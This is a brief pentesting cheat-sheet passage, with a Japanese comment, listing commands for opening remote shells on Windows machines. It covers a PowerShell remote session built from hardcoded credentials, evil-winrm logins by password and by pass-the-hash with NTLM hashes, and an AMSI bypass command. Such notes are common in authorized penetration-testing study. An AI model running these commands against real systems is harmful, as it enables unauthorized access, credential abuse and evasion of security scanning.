### Powershell
```sh
# バインドシェル上のPowershellでリモートセッションを作ると挙動がおかしくなる可能性があるので注意
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

### evil-winrm
```sh
$ evil-winrm -u '[MEGACORP\]snovvcrash' -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -e `pwd`
$ evil-winrm -u '[MEGACORP\]snovvcrash' -H fc525c9683e8fe067095ba2ddc971889 -i 10.10.13.37 -s `pwd` -e `pwd`

evil-winrm -u user -p password -i 192.168.0.1

# PtH
evil-winrm -u user -H 0e363213e37b94221497260b0bcb4fc -i 10.10.10.10
menu
Bypass-4MSI
```